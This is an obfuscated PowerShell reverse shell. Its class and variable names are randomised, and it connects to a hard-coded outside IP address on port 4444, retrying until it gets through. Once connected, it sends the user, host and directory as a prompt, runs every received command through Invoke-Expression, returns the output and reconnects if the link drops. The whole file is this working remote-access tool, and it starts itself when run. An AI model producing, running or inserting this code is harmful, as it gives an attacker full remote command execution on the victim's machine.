class HycFuKzYwEyWSBPhwqFHGZJ {
    
    [string]$UrXHi = "93.49.240.195"
    [int]$LfWznG = 4444

    $LQsSisTEqurRWFNy
    $zaJGuNNTzswFgajLga
    $lBkUtOTpBs
    $YLOafVsjjGqU
    $ooZlZTlDOACKYLRolPeRF
    $pLQCIUgCp
    [int]$adWlnkHuEpZTzH = 50*1024

    sXLihTjLZueigIfmxHREllR() {
        $this.zaJGuNNTzswFgajLga = $false
        while ($true) {
            try {
                $this.zaJGuNNTzswFgajLga = New-Object Net.Sockets.TcpClient($this.UrXHi, $this.LfWznG)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.tlXRUovqDdSk()
    }

    tlXRUovqDdSk() {
        $this.LQsSisTEqurRWFNy = $this.zaJGuNNTzswFgajLga.GetStream()
        $this.YLOafVsjjGqU = New-Object Byte[] $this.adWlnkHuEpZTzH
        $this.pLQCIUgCp = New-Object Text.UTF8Encoding
        $this.lBkUtOTpBs = New-Object IO.StreamWriter($this.LQsSisTEqurRWFNy, [Text.Encoding]::UTF8, $this.adWlnkHuEpZTzH)
        $this.ooZlZTlDOACKYLRolPeRF = New-Object System.IO.StreamReader($this.LQsSisTEqurRWFNy)
        $this.lBkUtOTpBs.AutoFlush = $true
    }

    gEKAuxOdaSHxBEZHTyh() {
        $this.sXLihTjLZueigIfmxHREllR()
        $this.dProzHgru()
    }

    tlClwGf($dvGeJIkjFSyWF) {
        try {
            [byte[]]$OTinfGnlmqKn = [text.Encoding]::Ascii.GetBytes($dvGeJIkjFSyWF)
            $this.lBkUtOTpBs.Write($OTinfGnlmqKn, 0, $OTinfGnlmqKn.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.gEKAuxOdaSHxBEZHTyh()
        }
    }

    [string] aiLVCdN() {
        try {
            $QocUuCknGILwbEkxHHstwpR = $this.LQsSisTEqurRWFNy.Read($this.YLOafVsjjGqU, 0, $this.adWlnkHuEpZTzH)    
            $kMBqOQFhLzXlnHjARxsLrmxm = ($this.pLQCIUgCp.GetString($this.YLOafVsjjGqU, 0, $QocUuCknGILwbEkxHHstwpR))
            return $kMBqOQFhLzXlnHjARxsLrmxm
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.gEKAuxOdaSHxBEZHTyh()
            return ""
        }
    }

    [string] rwzIqvLRBMi($rSIbcRTHzxwFIuQtTgBP) {
        Write-Host $rSIbcRTHzxwFIuQtTgBP
        try { 
            $StqJkznlfTzp = Invoke-Expression $rSIbcRTHzxwFIuQtTgBP | Out-String
        }
        catch {
            $CoKWE = $_.Exception
            $JGwzifgIaYRJqes = $_.Message
            $StqJkznlfTzp = "`n$_`n"
        }
        return $StqJkznlfTzp
    }

    [string] jUzfROBbrogWLrtbcPyp() {
        $xfmkofUiV = [Environment]::UserName
        $JynTlg = [System.Net.Dns]::GetHostName()
        $owJsPTCUHNHAoFifVTzXpLU = Get-Location
        return "$xfmkofUiV@$JynTlg [$owJsPTCUHNHAoFifVTzXpLU]~$ "
    }

    dProzHgru() {
        while ($this.zaJGuNNTzswFgajLga.Connected) {
            $this.tlClwGf($this.jUzfROBbrogWLrtbcPyp())         
            $kMBqOQFhLzXlnHjARxsLrmxm = $this.aiLVCdN()
            $StqJkznlfTzp = "`n"
            if ([string]::IsNullOrEmpty($kMBqOQFhLzXlnHjARxsLrmxm)) {
                continue
            }
            $StqJkznlfTzp = $this.rwzIqvLRBMi($kMBqOQFhLzXlnHjARxsLrmxm)
            $this.tlClwGf($StqJkznlfTzp + "`n")
            $this.LQsSisTEqurRWFNy.Flush()
        }
        $this.zaJGuNNTzswFgajLga.Close()
        $this.gEKAuxOdaSHxBEZHTyh()
    } 
}

$cCcfPIiFMHWFgYsDiMbPgc = [HycFuKzYwEyWSBPhwqFHGZJ]::new()
$cCcfPIiFMHWFgYsDiMbPgc.gEKAuxOdaSHxBEZHTyh()
